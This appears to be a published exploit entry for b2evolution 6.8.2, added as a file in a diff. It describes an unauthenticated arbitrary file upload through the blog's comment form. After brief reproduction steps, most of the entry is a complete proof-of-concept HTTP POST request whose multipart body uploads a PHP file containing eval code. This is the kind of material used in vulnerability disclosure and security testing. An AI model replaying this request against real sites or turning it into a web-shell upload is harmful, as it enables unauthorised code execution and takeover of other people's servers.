@@ -1,0 +1,125 @@
+# Exploit Title: b2evolution6.8.2stable – Upload
+# Date: 29/12/2016
+# Exploit Author: Li Fei
+# Vendor Homepage: http://b2evolution.net/
+# Software Link: http://b2evolution.net/downloads/6-8-2-stable?download=6407
+# Version: 6.8.2
+# Tested on: win7 64bit
+
+No need admin access for upload files and we can upload any file without bypass(.php,.exe,....)
+
+1-goto http://localhost/b2evolution/index.php/a/extended-post
+
+2- click on Browse botton and select you`re file
+
+3- click on upload
+
+Ceshi.php path is:
+
+http://SiteName/ceshi.php
+
+poc url:
+
+POST /b2evolution/htsrv/comment_post.php HTTP/1.1
+
+Poc header:
+
+Host: localhost
+
+Content-Length: 1054
+
+Cache-Control: max-age=0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Origin: http://localhost
+
+Upgrade-Insecure-Requests: 1
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
+
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Referer: http://localhost/b2evolution/index.php/a/extended-post
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: zh-CN,zh;q=0.8
+
+Cookie: session_b2evo=8323_COaAvLi6oU0LKIlMsoa207tOu4MRliDS; iCMS_USER_AUTH=93f92757UuFn7JIQa3nI%252Bk%252FF0s5elmm8KsIgZm%252F357CeOEhJUy7AsnKbPiZUa2eJTzmQx9lPUSaQcNVQtRiWJd%252BCBX0BQ4UpjoiTRBtkGujEc8rTtKoz3IGSFexrQEnmFfxKiL%252B1KR4nGq9wA88zDfJw6c1D7w7xeiYht2Iwo72Fcv8s6JjLcedy52QCOTHRPAFQ%252BdKcClUZz4vjvIvfZi5j6V4xQ1jpbnvV%252FMH6uyw7%252BL4Q41xqDKfgf1j7Sl36%252FGiXHwnij92A6nAMnxG78ZkUg5WG9PY5AtTyEMEtrHAuip7iPJbItdeuTSiTqwoIff%252BLuU4FM9nEldOYY2Jm9UD6XdgaXuyZBHhvb1v0buICmdQPX6rfrki9lZA; iCMS_userid=faf9c76a%252FQiEcyDoXBxmLMRDumokuULwqflVA%252FnfKJbcmsqFgw; iCMS_nickname=a693e7b1f4QEBL83uf0qmVI9BhIOCYq%252FTxa7NPwX8xobJpNm8bA; a8850_times=1; CNZZDATA80862620=cnzz_eid%3D1580835190-1482064117-http%253A%252F%252Flocalhost%252F%26ntime%3D1482064117; iweb_captcha=a95d2426cce76ef614NzA5ODI0NDUwOT5uZjFmY2RibDw4NGMyZjYxYzdmY2Bsa2ppdA; iweb_admin_role_name=6f99d0f079b6898180NDA1OTgwODg2NTk2PWA0Y2IwNGY9YWJgYWI3PmpgO2TrtofivafjrqbnmIXtkZg; iweb_admin_id=bef908b03b94700ce0ODA1MDEwMDAwMGowOTZlNzUwMTg2MDMxMmA3MWIxMzYx; iweb_admin_name=bef908b03b94700ce0ODA1MDEwMDAwMD8xbmUzMWFlOThiOzI3YjVmOjFgMjlhbWxpZg; iweb_admin_pwd=52f2f828c001b132f5NzAwMDc1NDcwMTg9YTE3NW8xYzA0M2E1YDdlYmY9YTllMjBnYmAyOjI5amEyOWNkYGU3NmUwNTdmNDVjPTA1ZQ
+
+Connection: close
+
+ 
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Content-Disposition: form-data; name="comment_rating"
+
+ 
+
+ 
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Content-Disposition: form-data; name="g"
+
+ 
+
+ 
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Content-Disposition: form-data; name="uploadfile[]"; filename="ceshi.php"
+
+Content-Type: application/octet-stream
+
+ 
+
+<?php
+
+eval("echo'hello world';");
+
+?>
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Content-Disposition: form-data; name="submit_comment_post_19[save]"
+
+ 
+
+Send comment
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Content-Disposition: form-data; name="crumb_comment"
+
+ 
+
+dXuthsKjMjhG2dnhADtzzOW414qV6Qky
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Content-Disposition: form-data; name="comment_type"
+
+ 
+
+comment
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Content-Disposition: form-data; name="comment_item_ID"
+
+ 
+
+19
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL
+
+Content-Disposition: form-data; name="redirect_to"
+
+ 
+
+http://localhost/b2evolution/index.php/a/extended-post
+
+------WebKitFormBoundarytZ4hUYCjABZB7YSL—
